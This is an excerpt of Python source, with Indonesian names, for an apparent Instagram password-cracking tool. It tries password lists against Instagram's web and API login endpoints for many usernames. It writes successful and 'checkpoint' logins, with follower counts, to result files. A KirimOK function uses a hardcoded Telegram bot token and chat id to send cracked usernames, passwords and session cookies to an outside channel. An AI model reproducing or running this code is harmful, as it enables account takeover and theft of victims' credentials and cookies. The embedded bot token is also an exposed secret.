	...
	if len(kya) == 0:
		for kyta in kya:
			try:
				...
				open('/sdcard/.Cokies-IG.txt','w').write(f'{kyta}')
				print(f'\n{P}Login sebagai : {req}')
				time.sleep(2)
				return(kyta)
...
def Aset_Ig():
	Clear()
	if os.path.isfile('/sdcard/.Cokies-IG.txt') is True:
		coki = {'cookie':open('/sdcard/.Cokies-IG.txt','r').read()}
	else:
	...
	try:
		...
		open('/sdcard/.Cokies-IG.txt','w').write(f'{coki["cookie"]}')
...
def Metode(): 
	global Login_Dengan
	prints(Panel(f"[[bold cyan]01[bold white]] Methode Api www.instagram.com \n[[bold cyan]02[bold white]] Methode Api i.instagtam.com\n[[bold cyan]03[bold white]] Methode www.instagtam.com [ Threads ] ",padding=(0,7),style=f"bold green"))
	method = input(f'──╭➣ Pilih 1 Sampai 3 : ')
...
def KirimOK(fullname, username, password, peng, meng, post, cookies):
	Token = "7595246422:AAEbi8rytMpqZL1b1dDaRa8fFR3UrASIYjs"
	chat_id = "-1002203927878"
	...
	for password in memek:
		try:
			...
			if 'Bearer IGT:2:' in str(response.text.replace('\\', '')) and '"pk_id":' in str(response.text.replace('\\', '')):
				...
				print(f"                                                                ", end='\r')
				time.sleep(0.10)
				print(f"{H}Login successful!")
				print(f"\n{B}{username} | {password}")
				print(f"{H}Followers: {peng}")
				print(f"{H}Posts: {post}")
				print(f"{H}Following: {meng}")
				print(f"{B}Cookies:\n{P}{ig_set_authorization}{cookies}")
				KirimOK(fullname, username, password, peng, meng, post, cookies)
				...
				print(f"\n{K}{username} | {password}")
				print(f"{K}Followers: {peng}")
				print(f"{K}Posts: {post}")
				print(f"{K}Following: {meng}")
	...
	for password in memek:
		try:
			...
			if 'logged_in_user' in str(response.text) and '"pk_id":' in str(response.text):
				...
				print(f"{H}Posts: {post}")
				print(f"{H}Following: {meng}")
				print(f"{B}Cookies:\n{P}{ig_set_authorization}")
				KirimOK(fullname, username, password, peng, meng, post)
				open('/sdcard/RESULTS-INSTAGRAM/'+Okc, 'a').write(f"{username}|{password}|{peng}")
				break
	...
	for password in memek:
		try:
			...
			if 'Bearer IGT:2:' in str(response.text.replace('\\', '')) and '"pk_id":' in str(response.text.replace('\\', '')) or "logged_in_user" in str(response.text.replace('\\', '')):
				...
				print(f"{H}Following: {meng}")
				print(f"{B}Cookies:\n{P}{cookies}")
				open(f'/sdcard/RESULTS-INSTAGRAM/{Okc}', 'a').write(f"{username}|{password}|{peng}")
				break
			elif 'challenge_required' in str(response.text.replace('\\', '')) or 'https://i.instagram.com/challenge/' in str(response.text.replace('\\', '')):
				Cp += 1
				post, peng, meng, mail, fullname, fbid, phone = data_target(username)
				...
				print(f"{K}Posts: {post}")
				print(f"{K}Following: {meng}")
				open(f'/sdcard/RESULTS-INSTAGRAM/{Cpc}', 'a').write(f"{username}|{password}|{peng}")
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
...
def Crack_web(username, memek):
	global Ok, Cp, Loop
	sys.stdout.write(f"\r{b}╰─{b}▶◀{b}[{Loop}{b}/{str(len(Uuid))}{b}]{b}▶◀{b}[{b}{Ok}{b}]{b}▶◀{b}[{k}{Cp}{b}]{b}▶◀{b}[{bo}{'{:.0%}'.format(Loop/float(len(Uuid)))}{b}]  ")
	sys.stdout.flush() 
	for password in memek:
		try:
			ses = requests.Session()
			...
			response = ses.get('https://www.instagram.com/accounts/login/', headers=header)
			...
			login_response = ses.post(url, headers=login_headers, data=data ,allow_redirects=False)
			if 'Bearer IGT:2:' in str(login_response.text.replace('\\', '')) and '"pk_id":' in str(login_response.text.replace('\\', '')):
				x = ses.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s" % username, headers={"user-agent": aguss(), "x-ig-app-id": '936619743392459'})
				...
				print(f"{H}Login successful!")
				print(f"\n{B}{username} | {password}")
				print(f"{H}Followers: {pengikut}")
				print(f"{H}Posts: {postingan}")
				print(f"{H}Following: {mengikut}")
				print(f"{B}Cookies:\n{P}{cookie}")
				open(f"result/success.txt","a").write(f'{username}|{password}|{pengikut}|{mengikut}\n')
				break
			elif 'challenge_required' in str(login_response.text.replace('\\', '')) or 'href="https://i.instagram.com/challenge/"' in str(login_response.text.replace('\\', '')):
				Cp+=1
				x = ses.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(username),headers={"user-agent":InstaIgeh(),"x-ig-app-id":'936619743392459'})
				...
				print(f"{K}Login checkpoint!")
				print(f"\n{K}{username} | {password}")
				print(f"{K}Followers: {pengikut}")
				print(f"{K}Posts: {postingan}")
				print(f"{K}Following: {mengikut}")
				open(f"result/checkpoint.txt","a").write(f'{username}|{password}|{pengikut}|{mengikut}\n')
				break
			else:
				continue
...
if __name__=='__main__':
	...
	try:os.mkdir('/sdcard/RESULTS-INSTAGRAM')
	except:pass
	try:os.mkdir('Data')
	except:pass
	try:
